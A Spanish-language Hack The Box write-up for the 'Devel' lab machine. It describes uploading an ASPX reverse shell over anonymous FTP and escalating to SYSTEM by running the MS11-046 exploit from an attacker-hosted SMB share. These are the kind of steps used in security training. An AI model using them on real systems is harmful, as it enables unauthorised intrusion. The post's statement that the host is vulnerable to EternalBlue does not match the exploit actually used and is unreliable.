---
layout: post
title: Devel
date: 2022-11-18
categories: ["HTB", "FTP", "EternalBlue"]
thumbnail: "assets/images/Devel.png"
---

# Devel [ Hack The Box ]

### Reconocimiento

#### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 10.10.10.5 -oG allPorts`
- `nmap -sCV -p21,80 10.10.10.5 -oN targeted`

Vemos que el acceso anónimo por `FTP` está permitido.

### Shell

Inspeccionando la página vemos la página de `IIS 7` por defecto, así que no nos sirve de nada, por lo que pasamos a `FTP`, ya que tenemos entrada anónima permitida.

Cuando nos conectamos por `FTP` vemos dos archivos: `index.htm` y `welcome.png`. Podemos intuir que es el servidor web. Sabiendo que la máquina es `Windows` y que `IIS` (por defecto) no interpreta archivos `PHP` nos vamos a crear una shell en `ASPX`, por lo que buscamos una Shell en [`GitHub`](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) y la utilizamos.

Cambiamos la `IP` y puerto que nos viene en el `script` para que la conexión se redireccione a nuestra máquina, una vez hecho esto nos ponemos en escuha con `NC` por el puerto que hayamos especificado.

- `nc -nlvp 4444`

Bien! Una vez hecho todo esto nos volvemos a conectar por `FTP` y con `put` mandamos la Shell al servidor, de tal manera que si ahora nos vamos a `http://10.10.10.5/shell.aspx` deberíamos recibir una conexión.

Bien! Ya estamos en la máquina como `web`!

### Subida de privilegios

Ya tenemos acceso a la máquina, pero queremos ser `NT Authority\System`, así que lo
primero que haré será enumerar la versión de `Windows` con `systeminfo`. Vemos que es `Windows 7`, por lo que nos disponemos a buscar vulnerabilidades y tras un rato vemos que es vulnerable a `EternalBlue`, nos encontramos con un ejecutable llamado [`MS11-046.exe`](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe).

Una vez descargado el archivo en nueastra máquina nos montaremos un servidor `SMB` para así poder ejecutar el archivo en la máquina víctima, así que hacemos lo siguiente:

- `smbserver.py black .`

Una vez tengamos el servidor montado tenemos que ejecutar el archivo en la máquina, para eso haremos lo siguiente:

```
c:\Windows\Microsoft.NET\Framework>\\10.10.14.15\share\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

Bien! Tras esperar unos segundos vemos que nos hemos convertido en `NT Authority\System`!

Enhorabuena! Ya somos administradores de la máquina de una manera muy fácil!